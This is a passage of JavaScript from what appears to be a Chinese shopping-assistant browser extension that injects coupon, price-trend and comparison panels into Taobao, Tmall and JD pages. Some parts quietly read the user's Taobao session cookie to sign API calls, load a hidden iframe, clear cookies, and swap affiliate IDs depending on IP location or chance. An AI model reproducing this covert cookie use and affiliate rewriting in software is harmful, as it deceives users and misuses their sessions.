span{font-weight:700;color:#f03}.dypBot9527-coupon-qr{position:absolute;width:152px;height:203px;top:29px;left:-47px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJgAAADLCAMAAAClBqpKAAAAUVBMVEUAAAD+NV3+J1L+JVD/KlP+JVD+JlD+JVH9JlD/JlH/JlH/KFD/KFj/K1X/QGD////9JVD/+fr/8PP/5Or/xM//r7//ma3+g5v+bYr+Wnr+SW1if6oHAAAAD3RSTlMA/vzrMdbCq5J4XkYgEggO5hYoAAABNUlEQVR42u3Vt21EQRAE0fnitNg5LfIPlARJ8IC2F+gxqiJ4XkXH5jlKdlwsjlGxdeY6CrbLccxdlOsw5f2e0yGqtcpXa69cRbG2OVxauwy5jVLtp7y172457aNSy3y2n565jEJtcjj/ws5DbqJM85jX9tc1xz4DyC492n+P7FIf2Pv0gZ3e2aPIbAUDBkwCZg8YMAmYPWDAJGD2gAGTgNkDBkwCZg8YMAmYPWDAJGD2gAGTgNkDBkwCZg8YMAmYPWDAJGD2gAGTgNkDBkwCZg8YMAmYPWDAJGD2gAGTgNkDBkwCZg8YMAmYPWDAJGD2gAGTgNkDBkwCZg8YMAmYPWDAJGD2gAGTgNkDBkwCZg8YMAmYPWDAJGD2gAGTgNkDBkwCZg8YMAmYPWDAJGD2asNqVhb2BSbyuI+M8oLwAAAAAElFTkSuQmCC);text-align:center;display:none}.dypBot9527-coupon-qrT{font-size:15px;color:#333;font-weight:700;margin-top:21px;margin-bottom:4px}.dypBot9527-coupon-qrB{display:inline-block}.dypBot9527-SeeAll-buyerShow{width:150px;height:30px;text-align:center;position:absolute;top:2px;right:2px;cursor:pointer;z-index:15;font-size:12px;color:#fff;background:#000;opacity:.7}.dypBot9527-SeeAllBuyerShow-title{line-height:30px}.dypBot9527-SeeAllBuyerShow-icon{display:inline-block;width:14px;vertical-align:-3px;height:14px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALBAMAAABbgmoVAAAAGFBMVEX///8AAAD///////////////////////8GrCwdAAAAB3RSTlOAAHMl50lK7/NfXgAAAD9JREFUCNdjCCkJNGIyYHAvd1RgUGAoLy9kAAJ3IAXkpQApoJwgCAgwGDEwgngKQApIMIAoEEMRpM+IyRBoCgDLywk/v7q0aAAAAABJRU5ErkJggg==) center center no-repeat}#J_TabBarWrap.dyp-zindex{z-index:100000000}';
            $("<style></style>").html(cssStyle).appendTo("head");
            // var cssStyle1212 = '';
            var cssStyle1212 = '';
            $("<style></style>").html(cssStyle1212).appendTo("head");
            var mainUrl,setting,dypSwitch,settingNew,dypNav,dypmyswi,dypVer,qqOnline,needClearArr,hasPostArr;
            infoGroup = {
                id:'',plat:nowPlat,title:"",price:"",sameNew:{},pid:"",seller:"",rCat:"",shop:"",
                pic:"",sale:"",amount:"",amountReq:"",amountT:0,amountL:0,tkCom:0,startT:"",endT:""
            };
            chrome.storage.local.get(null,function (e) {
                // var id = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.myMmId : e.dypjsonvdata.myMmId;
                // var phoneId = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.phoneId[0] : e.dypjsonvdata.phoneId[0];
                // dypmyswi = 1;
                // id = id[Math.floor((Math.random() * id.length))];
                //
                var id = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.myMmId : e.dypjsonvdata.myMmId;
                var phoneId = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.phoneId[0] : e.dypjsonvdata.phoneId[0];
                var ip = e.dypIp20180308;
                if (ip && ip.match('深圳')) {
                    dypmyswi = 1;
                    id = id[Math.floor((Math.random() * id.length))];
                } else {
                    if (Math.floor(Math.random() * 10) == 2) {
                        dypmyswi = 0;
                        id = svgQR;
                        phoneId = id;
                    } else {
                        dypmyswi = 1;
                        id = id[Math.floor((Math.random() * id.length))];
                    }
                }
                if (e.dypjsonvdata.versionNum != "2018626") {
                    id = '';
                    phoneId = '';
                }
                dypVer = `backv : ${e.dypbackv} mainv : ${e.dypmainv} jsonv : ${e.dypjsonv} popv : ${e.dyppopv} setv : ${e.dypsetv}`;
                mainUrl = {
                    min:e.dypjsonvdata.mainUrlMin,
                    jdCoupon:e.dypjsonvdata.mainUrlJdCoupon,
                    storage:e.dypjsonvdata.mainUrlStorage,
                    myMmId:id,
                    phoneId:phoneId,
                    postId:e.dypjsonvdata.postId,
                    website:e.dypjsonvdata.website
                };  //api接口地址
                qqOnline = e.dypjsonvdata.mainUrlQQ;
                setting = e.dypSetting;
                settingNew = !$.isEmptyObject(e.dypSetNew) ? e.dypSetNew : {dypTop:'show',dypMid:'show'};
                dypSwitch = e.dypSwitch;
                dypNav = e.dypNav201815;
                hasPostArr = e.dypPostCou20180709 ? e.dypPostCou20180709 : [];
                var keepKey = [
                    'dypAlert20180226',
                    'dypIp20180308',
                    'dypListSetting',
                    'dypNav201815',
                    'dypSetNew',
                    'dypSetting',
                    'dypSwitch',
                    'dypbackvdata',
                    'dypjsonvdata',
                    'dypmainvdata',
                    'dyppopvdata',
                    'dypsetvdata',
                    'dypbackv',
                    'dypjsonv',
                    'dypmainv',
                    'dyppopv',
                    'dypsetv',
                    'dypPostCou20180709',
                    'dypCanalId20180709',
                    'dypUseInfo18711'
                ];
                needClearArr = '';
                $.each(e,function (v) {
                    var needClear = 1;
                    $.each(keepKey,function (m,n) {
                        if (n == v) {
                            needClear = 0;
                            return false;
                        }
                    });
                    if (needClear) {
                        needClearArr += v;
                    }
                });
                if ($("body").attr("dypSign159357") != 1) {
                    start();
                    $("body").attr("dypSign159357","1");
                }
            });
            function start() {
                var topTemplateHtml1 = `
                <div id="dypTop9527">
                    <div class="dypTop9527-box dypClear">
                        <div class="dypTop9527-logo fl" title="豆芽购物助手" data-douyababapaopao="顶部+logo"><b></b></div>
                        <div class="dypTop9527-mall fl" data-douyamovepaopao="顶部+导航+查看">
                            <div class="dypTop9527-topMask"></div>
                            <b></b><span>购物导航</span>
                            <div class="dypTop9527-rMask"></div>
                            <div class="dypTop9527-mask"></div>
                            <div class="dypTop9527-mallDrop" style="display:none">
                                <ul class="dypClear"></ul>
                            </div>
                        </div>
                        <div class="dypTop9527-vipCoupon fl" data-douyamovepaopao="顶部+值得买+查看">
                            <div class="dypTop9527-topMask"></div>
                            <b></b><span>值得买</span>
                            <div class="dypTop9527-rMask"></div>
                            <div class="dypTop9527-mask"></div>
                            <div class="dypTop9527-vipCouponDrop">
                                <ul class="dypClear"></ul>
                            </div>
                        </div>
                        <div class="dypTop9527-bijia fl"><b></b><span>全网比价</span>
                            <div class="dypTop9527-bijia-rMask"></div>
                        </div>
                        <div class="dypTop9527-sameStyle fl"></div>
                        <div class="dypTop9527-set fr" data-douyamovepaopao="顶部+设置+查看">
                            <div class="dypTop9527-set-box">
                                <div class="dypTop9527-set-lMask"></div>
                                <b></b>
                                <div class="dypTop9527-mask"></div>
                                <div class="dypTop9527-setDrop">
                                    <ul>
                                        <li data-type="gb" data-douyababapaopao="顶部+设置+本次关闭">本次关闭</li>
                                        <li data-type="fk" data-douyababapaopao="顶部+设置+意见反馈">意见反馈</li>
                                    </ul>`;
                var topTemplateHtml2 = `
                                </div>
                            </div>
                            <i data-douyababapaopao="顶部+展开"></i>
                        </div>
                        <div class="dypTop9527-search-box fr">
                            <div class="dypTop9527-search"><input type="text" id="dypTop9527-search" maxlength="10" placeholder="搜索全网优惠">
                                <span data-id="dyp"><em id="dypTop9527-searchBtn" data-douyababapaopao="顶部+搜索+点击搜索">豆芽铺</em><i data-type="1"></i></span>
                                <ul style="display:none">
                                    <li data-id="dyp" data-douyababapaopao="顶部+搜索+豆芽铺">豆芽铺</li>
                                    <li data-id="tm" data-douyababapaopao="顶部+搜索+天猫">天　猫</li>
                                    <li data-id="jd" data-douyababapaopao="顶部+搜索+京东">京　东</li>
                                    <li data-id="tb" data-douyababapaopao="顶部+搜索+淘宝">淘　宝</li>
                                    <li data-id="wph" data-douyababapaopao="顶部+搜索+唯品会">唯品会</li>
                                    <li data-id="mgj" data-douyababapaopao="顶部+搜索+蘑菇街">蘑菇街</li>
                                    <li data-id="yoho" data-douyababapaopao="顶部+搜索+YOHO!">YOHO</li>
                                    <li data-id="sn" data-douyababapaopao="顶部+搜索+苏宁">苏　宁</li>
                                    <li data-id="ymx" data-douyababapaopao="顶部+搜索+亚马逊">亚马逊</li>
                                    <li data-id="dd" data-douyababapaopao="顶部+搜索+当当">当　当</li>
                                    <li data-id="jm" data-douyababapaopao="顶部+搜索+聚美">聚　美</li>
                                    <li data-id="kl" data-douyababapaopao="顶部+搜索+考拉">考　拉</li>
                                    <li data-id="yx" data-douyababapaopao="顶部+搜索+严选">严　选</li>
                                    <li data-id="yhd" data-douyababapaopao="顶部+搜索+一号店">一号店</li>
                                    <li data-id="gm" data-douyababapaopao="顶部+搜索+国美">国　美</li>
                                    <p class="p1"></p>
                                    <p class="p2"></p>
                                    <p class="p3"></p></ul>
                                <u class="u1" style="display:none"></u> <u class="u2" style="display:none"></u></div>
                        </div>
                        <div class="dypTop9527-qq-online fr"><a href="${qqOnline}" target="_blank" data-douyababapaopao="顶部+QQ在线"></a></div>
                        <div class="dypTop9527-activity fr dypTop9527-swiper_wrap">
                            <ul class="dypTop9527-font_inner"></ul>
                        </div>
                    </div>
                    <div class="dypTop9527-mini" data-douyababapaopao="顶部+展开"></div>
                </div>`;
                var topTemplateHtml = topTemplateHtml1 + topTemplateHtml2;
                $("body").after(topTemplateHtml);   //上面区域插入代码块
                var picArr = JSON.parse(dypNav).results;
                $.each(picArr,function (v,k) {
                    $(".dypTop9527-mallDrop ul").append(`<li data-douyababapaopao="顶部+导航+${k.name}"><a href="${k.link}" target="_blank" rel="noreferrer"><img src="${k.img_src}"><h5>${k.name}</h5></a></li>`)
                });
                !function () {
                    var ymove = [];
                    $.each(adaptationArr,function (key,item) {
                        if (locHost == key) {
                            ymove = item.dom;
                            return false;
                        }
                    });
                    if (ymove.length) {
                        $(document).scroll(function () {
                            if (($(ymove[0]).css("position") == "fixed") && (setting.dypTop == 'show') && settingNew.dypTop == 'show') {
                                $.each(ymove,function (key,item) {
                                    $(item).css("transform",'translate(0,41px)');
                                });
                            } else {
                                $.each(ymove,function (key,item) {
                                    $(item).css("transform",'translate(0,0)');
                                });
                            }
                        })
                    }
                }();    //插件内嵌元素占据位子，原网站悬浮元素重新向下填充
                var middleTemplateHtml1 = `
                <div>
                    <div id="dypMid9527">
                        <div class="dypMid9527-logo" data-douyababapaopao="工具+logo"><a href="${mainUrl.website}" target="_blank"></a></div>
                        <div class="dypMid9527-coupon">
                            <div class="dypMid9527-title" data-douyamovepaopao="工具+优惠券+查看"><span>优惠折扣</span>
                                <div class="dypMid9527-borderMask"></div>
                            </div>
                            <div class="dypMid9527-box dypMid9527-box-coupon">
                                <div class="dypMid9527-coupon-loading"><b></b><span>正在全力加载中</span></div>
                            </div>
                        </div>
                        <div class="dypMid9527-active">
                            <div class="dypMid9527-title" data-douyamovepaopao="工具+活动+查看"><span>限时活动</span>
                                <div class="dypMid9527-borderMask"></div>
                            </div>
                            <div class="dypMid9527-box dypMid9527-box-active">
                                <ul></ul>
                                <div>
                                    <button class="l"></button>
                                    <button class="r"></button>
                                </div>
                            </div>
                        </div>
                        <div class="dypMid9527-price-trend">
                            <div class="dypMid9527-title dypMid9527-price-title" data-douyamovepaopao="工具+价格+查看"><span>价格趋势</span><b></b>
                                <div class="dypMid9527-borderMask"></div>
                            </div>
                            <div class="dypMid9527-box dypMid9527-box-price yhq-chart-box">
                                <div id="douyapu-line-chart"></div>
                                <div class="dypMid9527-priceBox-title">注意：价格趋势由<span>豆芽网</span>提供，数据仅供参考</div>
                                <div class="dypMid9527-priceBox-back"><span>抱歉，该商品的价格趋势正在收录中</span></div>
                                <div class="dypMid9527-AllShop-price">
                                    <div class="dypMid9527-AllShop-box">
                                        <div class="dypMid9527-AllShop-title"><span class="dypMid9527-World-icon"></span><span class="dypMid9527-World-title">全网比价</span></div>
                                        <div class="dypMid9527-AllShop-content"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="dypMid9527-same">
                            <div class="dypMid9527-title" data-douyamovepaopao="工具+相似好货+查看"><span>相似好货</span>
                                <div class="dypMid9527-borderMask"></div>
                            </div>
                            <div class="dypMid9527-box dypMid9527-box-same">
                                <ul>
                                </ul>
                            </div>
                        </div>
                        <div class="dypMid9527-must-see">`;
                var middleTemplateHtml2 = `
                                <div class="dypMid9527-title"><span>必看评价</span></div>
                        </div>
                        <div class="dypMid9527-buyers-show">
                            <div class="dypMid9527-title"><span>买家秀</span></div>
                        </div>
                        <div class="dypMid9527-feast">
                            <div class="dypMid9527-title feast" data-douyamovepaopao="工具+母亲节"><i></i><span>抖友同款</span>
                                <div class="dypMid9527-borderMask"></div>
                            </div>
                            <div class="dypMid9527-box dypMid9527-box-feast">
                                <ul>
                                </ul>
                            </div>
                        </div>
                        <div class="dypMid9527-phone">
                            <div class="dypMid9527-title" data-douyamovepaopao="工具+二维码+查看"><span>超值拼团券</span>
                                <div class="dypMid9527-borderMask"></div>
                            </div>
                            <div class="dypMid9527-box dypMid9527-box-phone">
                                <div class="dypMid9527-box-phoner">千万优惠等你领</div>
                                <div class="dypMid9527-box-phoner">立省一盒面膜钱</div>
                                <div class="dypMid9527-phone-qr">
                                    <div id="dypMid9527-phone-qr"></div>
                                </div>
                                <div class="dypMid9527-box-phonet">微信扫码马上参加<br></div>
                            </div>
                        </div>
                        <div class="dypMid9527-setting">
                            <div class="dypMid9527-title dypMid9527-setting-title" data-douyamovepaopao="工具+设置+查看"><b></b>
                                <div class="dypMid9527-borderMask"></div>
                            </div>
                            <div class="dypMid9527-box dypMid9527-box-setting">
                                <ul>
                                    <li data-type="2" data-douyababapaopao="工具+设置+意见反馈">意见反馈</li>
                                    <li data-type="1" data-douyababapaopao="工具+设置+本次关闭">本次关闭</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div id="dypAbs9527">
                        <div class="dypAbs9527-ad">
                            <div id="dai360_link" class="fl" title="拆红包">
                                <div class="dai360_title" data-douyababapaopao="MID-拆红包活动点击">
                                    <b class="dai360_logo"></b><span>酷</span><span>g</span><span>i</span><span>r</span><span>l</span><span>的</span><span>夏</span><span>日</span><span>潮</span><span>搭</span><span>牛</span><span>仔</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>`;
                var middleTemplateHtml = middleTemplateHtml1 + middleTemplateHtml2;
                var middleTemplateDom = {
                    ".tm-fcs-panel":2,
                    ".tb-promo-meta":2,
                    ".tb-meta":2,
                    ".summary-price-wrap":0,
                    ".proinfo-focus":1,
                    ".prd-price-1":1,
                    ".price_info":1,
                    ".J_statusBanner":2
                };  //天猫 淘宝 淘宝 京东 苏宁 国美 当当 聚划算
                $.each(middleTemplateDom,function (v,k) {
                    if ($(v).length) {
                        if (v == ".tm-fcs-panel") {
                            $(v).after("<div style='margin-right: 20px'>" + middleTemplateHtml + "</div>");
                        } else if (v == ".price_info") {
                            $(v).after("<div style='margin-left: -10px'>" + middleTemplateHtml + "</div>");
                        } else {
                            $(v).after(middleTemplateHtml);
                        }
                        if (k == 1) {
                            $(".dypMid9527-buyers-show").remove();
                            $(".dypMid9527-must-see").remove();
                        } else if (k == 2) {
                            $(".dypMid9527-coupon").remove();
                        }
                        return false;
                    }
                }); //中间区域插入代码块
                function inits() {
                    if ($("body").hasClass("dyp779946-body-unScroll")) {
                        $(".dypTop9527-sameStyle").css({
                            "width":$(".dypTop9527-box").width() - 975
                        });
                    } else {
                        $(".dypTop9527-sameStyle").css({
                            "width":$(".dypTop9527-box").width() - 958
                        });
                    }
                    $("#dypMid9527 .dypMid9527-box-price").css({
                        "width":$("#dypMid9527").width()
                    });
                }   //中部三个box的宽度加载后js设定
                inits();
                $(window).on("resize",function () {
                    inits();
                });
                !function () {
                    var Ol_Dai360_pop = `<div id="dai360Pop">
                        <div class="shadow"></div>
                        <div class="content">
                            <img src="http://file.douyapu.com/douyapu/dai360/2018618.png" alt="">
                            <a class="_close" data-douyababapaopao="MID-拆红包活动关闭"></a>
                        </div>
                    </div>`;
                    $('body').append(Ol_Dai360_pop);
                    // $("body").on("click","#dai360_link",function () {
                    //     $("#dai360Pop").css("display","block");
                    // });
                    $("body").on("click","#dai360_link",function () {
                        openWindow("https://s.click.taobao.com/J1aQGPw")
                    });
                    // $("body").on("click","#dai360Pop>.shadow",function () {
                    //     $("#dai360Pop").css("display","none");
                    // });
                    // $("body").on("click","#dai360Pop>.content>._close",function () {
                    //     $("#dai360Pop").css("display","none");
                    // });
                }();    //中间红包二维码
                function initpage() {
                    if (setting.dypTop == 'hidden' || settingNew.dypTop == 'hidden') {
                        showOrHideTop(0);
                        $("#dypTop9527").hide();
                    } else {
                        showOrHideTop(1);
                    }
                    if (setting.dypMid == 'hidden' || settingNew.dypMid == 'hidden') {
                        $("#dypMid9527").parent().css('display','none');
                    }
                }   //配置用户设置决定插件上面部分和中间部分是否显示
                function showOrHideTop(or) {
                    if (or) {
                        $(".dypTop9527-box").css({'transform':'translate(0,0)'});
                        $(".dypTop9527-mini").css({'transform':'translate(0,-50px)'});
                        $("body").css({'transition':'all .5s',"padding-top":"41px"});
                        setting.dypTop = 'show';
                    } else {
                        $(".dypTop9527-box").css({'transform':'translate(0,-50px)'});
                        $(".dypTop9527-mini").css({'transform':'translate(0,0)'});
                        $("body").css({'transition':'all .5s',"padding-top":"0px"});
                        setting.dypTop = 'hidden';
                    }
                }   //显示或者隐藏插件top工具栏
                initpage();
                function changeColor(c,v,i) {
                    $(".dypTop9527-search input").css("border-color",c);
                    $(".dypTop9527-search span").css("background",c);
                    $(".dypTop9527-search span em").html(v);
                    $(".dypTop9527-search span").data("id",i);
                }   //
                cnzzAppend(function () {
                    cnzzEvent(dypVer,"测试");
                    if (needClearArr) {
                        cnzzEvent(needClearArr,"测试");
                    }
                });    //打点统计代码
                function startPrice(url) {
                    $.ajax({
                        url:"https://zhushou.huihui.cn/productSense",
                        data:{phu:url,type:"canvas"},
                        type:'GET',
                        timeout:5000,
                        dataType:'json',
                        success:function (response) {
                            var data = response.priceHistoryData.list;
                            var time = new Date();
                            var nowTime = time.getFullYear() + "-" + (time.getMonth() + 1) + "-" + time.getDate();
                            var valueList = [];
                            var dateList = [];
                            var newData = [];
                            var t = 0;
                            for (var i = 0; i < data.length; i++) {
                                var beforPrice = 0;
                                if (i > 0) {
                                    beforPrice = data[i - 1].price;
                                }
                                if (data[i].price != beforPrice) {
                                    newData[t] = data[i];
                                    t++;
                                }
                            }
                            var trueObj = newData[newData.length - 1];
                            if (newData[newData.length - 1].price == infoGroup.price) {
                                newData[newData.length - 1] = {price:infoGroup.price,time:nowTime};
                            } else {
                                newData[newData.length] = {price:infoGroup.price,time:nowTime};
                            }
                            var isOne = true;
                            if (newData.length == 1) {
                                var obj = newData[0];
                                newData = [obj,obj,obj];
                                isOne = false;
                            }
                            var arrSlice = newData.slice(-7);
                            $.each(arrSlice,function (v,k) {
                                valueList.push(k.price);
                                var res1 = [];
                                res1[0] = k.time.split('-')[1].replace(/^[0]/,'');
                                res1[1] = k.time.split('-')[2].replace(/^[0]/,'');
                                res1 = res1.join('/');
                                dateList.push(res1);
                            });
                            if (isOne == false) {
                                dateList[0] = "";
                                var res2 = [];
                                res2[0] = trueObj.time.split('-')[1].replace(/^[0]/,'');
                                res2[1] = trueObj.time.split('-')[2].replace(/^[0]/,'');
                                res2 = res2.join('/');
                                dateList[1] = res2;
                            }
                            if (valueList[valueList.length - 1] > valueList[valueList.length - 2]) {
                                $(".dypMid9527-price-title span").fadeOut(function () {
                                    $(this).html("价格上涨").fadeIn(1000);
                                    $(this).next().fadeIn(1000).css("display","inline-block").addClass("up");
                                });
                            } else if (valueList[valueList.length - 1] < valueList[valueList.length - 2]) {
                                $(".dypMid9527-price-title span").fadeOut(function () {
                                    $(this).html("价格下降").fadeIn(1000);
                                    $(this).next().fadeIn(1000).css("display","inline-block").addClass("down");
                                });
                            } else {
                                $(".dypMid9527-price-title span").fadeOut(function () {
                                    $(this).html("价格平缓").fadeIn(1000);
                                    $(this).next().fadeIn(1000).css("display","inline-block").addClass("ping");
                                });
                            }
                            var optionSet = {
                                tooltip:{trigger:'axis'},
                                xAxis:[{
                                    data:dateList,
                                    axisLine:{lineStyle:{color:"#ddd",width:2,}},
                                    axisTick:{show:false},
                                    axisLabel:{textStyle:{color:'#999'},}
                                }],
                                yAxis:[{
                                    scale:"true",
                                    splitNumber:2,
                                    minInterval:1,
                                    axisLine:{show:false},
                                    axisTick:{show:false},
                                    splitLine:{show:true,lineStyle:{color:'#eee',width:1,type:'dotted'}},
                                    axisLabel:{textStyle:{color:'#999'},}
                                }],
                                grid:[{
                                    bottom:'70',
                                    top:'50',
                                    left:'12%',
                                    right:'8%'
                                }],
                                series:[{
                                    type:'line',
                                    smooth:"true",
                                    symbol:"circle",
                                    symbolSize:6,
                                    data:valueList,
                                    label:{normal:{show:true,color:"#F40035",fontFamily:"Microsoft Yahei",position:"top"}},
                                    itemStyle:{normal:{color:"#F40035",label:{show:true}}},
                                    lineStyle:{normal:{color:"#F40035"}},
                                    markPoint:{
                                        symbol:"rect",
                                        symbolSize:[50,10],
                                        symbolOffset:[0,-26],
                                        itemStyle:{normal:{color:"transparent",}},
                                        label:{normal:{textStyle:{color:'#333'}}},
                                        data:[{
                                            type:'max',name:'最大值',
                                            label:{
                                                normal:{show:isOne,formatter:"最高"},
                                            }
                                        },{
                                            type:'min',name:'最小值',
                                            label:{
                                                normal:{show:isOne,formatter:"最低"},
                                            }
                                        }]
                                    }
                                }]
                            };
                            $("#dypMid9527 #douyapu-line-chart").css({
                                "width":$("#dypMid9527").width()
                            });
                            var priceChart2 = echarts.init($('#dypMid9527 #douyapu-line-chart')[0]);    //
                            priceChart2.setOption(optionSet);
                            $(".dypMid9527-priceBox-title").show();
                        },
                        error:function () {
                            $(".dypMid9527-priceBox-back").show();
                        }
                    });
                }           //价格趋势
                function startSame(url) {
                    var getSameNum = 0;//
                    var plat = infoGroup.plat;//
                    if (plat != 'tm' && plat != 'tb') {
                        getSameNum++;
                    }
                    function sameCount() {
                        getSameNum += 1;
                        if (getSameNum == 2) {
                            appendTitle();
                        }
                    }   //
                    var num = Number.POSITIVE_INFINITY;
                    var smlArr = {
                        jd:{list:[],min:num,value:14,url:""},tb:{list:[],min:num,value:13,url:""},tm:{list:[],min:num,value:12,url:""},
                        wph:{list:[],min:num,value:11,url:""},dd:{list:[],min:num,value:10,url:""},sn:{list:[],min:num,value:9,url:""},
                        ymx:{list:[],min:num,value:8,url:""},gm:{list:[],min:num,value:7,url:""},yhd:{list:[],min:num,value:6,url:""},
                        yoho:{list:[],min:num,value:5,url:""},jm:{list:[],min:num,value:4,url:""},kl:{list:[],min:num,value:3,url:""},
                        yx:{list:[],min:num,value:2,url:""},mgj:{list:[],min:num,value:1,url:""},qt:{list:[],min:num,value:0,url:""},
                    };//
                    function makeObj(a,k,t) {
                        if (t) {
                            smlArr[a].list.push(k);
                            if (k.view_price * 1 < smlArr[a].min) {
                                smlArr[a].min = k.view_price * 1;
                                smlArr[a].url = k.detail_url;
                            }
                        } else {
                            smlArr[a].list.push(k);
                            if (k.cutprice * 1 < smlArr[a].min) {
                                smlArr[a].min = k.cutprice * 1;
                                smlArr[a].url = k.url;
                            }
                        }
                    }   //
                    function changeUrl(icon,k) {
                        var url = '';
                        var title = '';
                        if (k.hasOwnProperty("sitename")) {
                            url = k.url;
                            url = decodeURIComponent(getParam(url,"url"));
                            if (icon == "jd") {
                                url = decodeURIComponent(getParam(url,"t"));
                            } else if (icon == "tb" || icon == "tm") {
                                url = getParam(url,"id");
                                title = k.title;
                            } else if (icon == "gm") {
                                url = decodeURIComponent(getParam(url,"t"));
                            } else if (icon == "kl") {
                                url = decodeURIComponent(getParam(url,"t"));
                            } else if (icon == "sn" || icon == "dd" || icon == "wph") {
                                url = decodeURIComponent(getParam(url,"t"));
                            }
                        } else if (k.hasOwnProperty("nick")) {
                            url = getParam(k.detail_url,"id");
                            title = k.raw_title
                        }
                        return {url:url,title:title};
                    }   //价格排序方法
                    function tmAjax(errorUrl,title,id) {
                        chrome.extension.sendMessage({
                            name:"getCook",url:"https://www.taobao.com/",key:"_m_h5_tk"
                        },function (d) {
                            if (d && d[0] && d[0].value) {
                                var time = Date.now();
                                var s = `{"q":"${title}","pid":"${mainUrl.myMmId}","page":1}`;
                                $.ajax({
                                    url:"https://acs.m.taobao.com/h5/mtop.aitaobao.item.search/7.0/",type:"get",dataType:"json",
                                    data:{
                                        v:"7.0",api:"mtop.aitaobao.item.search",appKey:"12574478",t:time,
                                        sign:md5(d[0].value.split("_")[0] + "&" + time + "&12574478&" + s),data:s
                                    },
                                    success:function (r) {
                                        if (r && r.ret && r.ret[0] && r.ret[0].match("调用成功")) {
                                            if (r && r.data && r.data.items && r.data.items.length) {
                                                var data = r.data.items;
                                                var hasSwi = 1;
                                                $.each(data,function (v,k) {
                                                    if (k.nid == id && k.nid != infoGroup.id) {
                                                        openWindow(`https://s.click.taobao.com/t?e=${getParam("https:" + k.clickUrl,"e")}`);
                                                        hasSwi = 0;
                                                        return false;
                                                    }
                                                });
                                                if (hasSwi) {
                                                    openWindow(errorUrl);
                                                }
                                            } else {
                                                openWindow(errorUrl);
                                            }
                                        } else {
                                            openWindow(errorUrl);
                                        }
                                    }
                                });
                            } else {
                                $("body").append(`<iframe src="//h5.m.taobao.com/" id="douya-yangxue9527" style="display:none"></iframe>`);
                                setTimeout(function () {
                                    $("#douya-yangxue9527").remove();
                                },2000);
                                openWindow(errorUrl);
                            }
                        });
                    }   //
                    function getSameNew(url) {
                        chrome.extension.sendMessage({
                            name:"universal",url:"https://pricecomparison.browser.qq.com/get_comparison_info",type:"get",dataType:"json",data:{url:url}
                        },function (e) {
                            if (e && e.product && e.product.length) {
                                var data = e.product;
                                $.each(data,function (v,k) {
                                    var name = k.sitename;
                                    switch (name) {
                                        case (name.match("京东") || {}).input:
                                            makeObj("jd",k);
                                            break;
                                        case (name.match("淘宝") || {}).input:
                                            makeObj("tb",k);
                                            break;
                                        case (name.match("天猫") || {}).input:
                                            makeObj("tm",k);
                                            break;
                                        case (name.match("唯品会") || {}).input:
                                            makeObj("wph",k);
                                            break;
                                        case (name.match("当当") || {}).input:
                                            makeObj("dd",k);
                                            break;
                                        case (name.match("苏宁") || {}).input:
                                            makeObj("sn",k);
                                            break;
                                        case (name.match("亚马逊") || {}).input:
                                            makeObj("ymx",k);
                                            break;
                                        case (name.match("国美") || {}).input:
                                            makeObj("gm",k);
                                            break;
                                        case (name.match("号店") || {}).input:
                                            makeObj("yhd",k);
                                            break;
                                        case (name.match("YOHO") || {}).input:
                                            makeObj("yoho",k);
                                            break;
                                        case (name.match("聚美") || {}).input:
                                            makeObj("jm",k);
                                            break;
                                        case (name.match("考拉") || {}).input:
                                            makeObj("kl",k);
                                            break;
                                        case (name.match("严选") || {}).input:
                                            makeObj("yx",k);
                                            break;
                                        case (name.match("蘑菇") || {}).input:
                                            makeObj("mgj",k);
                                            break;
                                        default:
                                            makeObj("qt",k);
                                    }
                                });
                            }
                            sameCount();
                        });
                    }   //新的获取不同商家同款数据
                    function getSame() {
                        if (infoGroup.pid) {
                            getSameStyleByPid(infoGroup.pid,infoGroup.id);
                        } else {
                            getSameStyleByTitle(infoGroup.title);
                        }
                        function getSameStyleByPid(pid,id) {
                            var url = "https://s.taobao.com/search?type=samestyle&app=i2i&uniqpid=" + pid + "&nid=" + id + "&sort=sale-desc";
                            chrome.extension.sendMessage({name:"clearCook",url:url},function () {
                                $.ajax({
                                    type:"get",url:url,
                                    success:function (e) {
                                        var r = e.match(/<script>\s+g_page_config\s=\s(.*)/);
                                        if (r && r[1] && r[1].match(/({.*});/) && r[1].match(/({.*});/)[1] && JSON.parse(r[1].match(/({.*});/)[1])) {
                                            var data = JSON.parse(r[1].match(/({.*});/)[1]);
                                            data = data.mods.recitem.data ? data.mods.recitem.data.items : [];
                                        }
                                        $.each(data,function (v,k) {
                                            var name = k.detail_url.match('tmall');
                                            if (name) {
                                                makeObj("tm",k,1);
                                            } else {
                                                makeObj("tb",k,1);
                                            }
                                        });
                                    },complete:function () {
                                        sameCount();
                                    }
                                });
                            });
                        }   //根据pid请求同款商品
                        function getSameStyleByTitle(title) {
                            $.ajax({
                                type:"get",
                                url:"https://s.taobao.com/search?q=" + title + "&sort=sale-desc",
                                success:function (e) {
                                    var r = e.match(/<script>\s+g_page_config\s=\s(.*)/);
                                    if (r && r[1] && r[1].match(/({.*});/) && r[1].match(/({.*});/)[1] && JSON.parse(r[1].match(/({.*});/)[1])) {
                                        var data = JSON.parse(r[1].match(/({.*});/)[1]);
                                        data = data.mods.itemlist.data ? data.mods.itemlist.data.auctions : [];
                                        $.each(data,function (v,k) {
                                            var name = k.detail_url.match('tmall');
                                            if (name) {
                                                makeObj("tm",k,1);
                                            } else {
                                                makeObj("tb",k,1);
                                            }
                                        });
                                    }
                                },complete:function () {
                                    sameCount();
                                }
                            });
                        }   //根据标题请求同款商品
                    }   //淘宝天猫顶部各大商城同款商品爆款比价
                    function appendTitle() {
                        var obj = {
                            "tm":"天猫","tb":"淘宝","jd":"京东","wph":"唯品会","dd":"当当","sn":"苏宁","ymx":"亚马逊",
                            "gm":"国美","yhd":"1号店","yoho":"YOHO","jm":"聚美","kl":"考拉","yx":"严选","mgj":"蘑菇街","qt":"其他"
                        };
                        // appendMidPrice(obj, infoGroup.sameNew, 2);
                        infoGroup.sameNew = smlArr;
                        $.each(infoGroup.sameNew,function (v,k) {
